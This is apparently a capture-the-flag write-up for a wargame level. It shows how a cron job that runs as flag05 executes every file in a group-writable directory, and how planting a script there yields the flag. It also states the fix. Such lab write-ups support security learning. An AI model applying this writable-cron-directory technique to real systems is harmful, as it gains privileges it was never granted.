# Security Vulnerability for Level05

The vulnerability is caused by a writable directory whose files are automatically executed with flag05 privileges; to prevent it, only trusted, non-writable files should be executed by the privileged cron job.

## Finding the Password for the `level06` User

No files are provided on the root.

### 1. Find Files Owned by `flag05` User:

```bash
find / -user flag05 2>/dev/null
```
Output:
```bash
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

### 2. Script in `/usr/sbin/openarenaserver`

```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

This script takes every file from `/opt/openarenaserver/`, gives it execution permission, executes and delete it.

### 3. You have a New Mail

One time after connecting to the `level05` user one message appeared:
```bash
You have new mail.
```
It is not shown every time after connection to `level05` user, which means it can be a programed script that are shown from time to time.

Find a file/directory with `mail`:
```bash
find / mail 2>/dev/null
```
There are several results, check anything with word `mail` in it.
```bash
prompt>cd /rofs/var/mail

prompt>ls -l
total 1
-rw-r--r-- 1 root mail 58 Mar 12  2016 level05

prompt> cat level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
This is a cron - tool that run a script at a specified frequency.  
`*/2` means the command is executed every two minutes.
Which means that the script in `/usr/sbin/openarenaserver` is run every 2 minutes.  
The script iterates over all files in `/opt/openarenaserver/` and executes them with the privileges of flag05.

### 4. Add Our Own File to `/opt/openarenaserver/`

The directory `/opt/openarenaserver/` has permissions:
```bash
drwxrwxr-x+ 2 root root 40 Sep 17 12:52 /opt/openarenaserver/
```
`+` indicates that additional ACL (Access Control List) permissions are defined for this directory.

Command to see all the permissions:
```bash
getfacl /opt/openarenaserver
```
The important part from the output:
```bash
user:level05:rwx
```
We can create our own file in the directory.

Put command in the file:
```bash
echo $(getflag) > our_own_file
```
`our_own_file` - any file created in a directory where `level05` user can write.

```bash
find / -writable
```
For example: `/var/tmp/`

### 5. Get the Flag
Within two minutes, the cron job should execute the file. We can then retrieve the flag with:
```bash
cat our_own_file
```
Output:
```bash
Check flag.Here is your token : 
```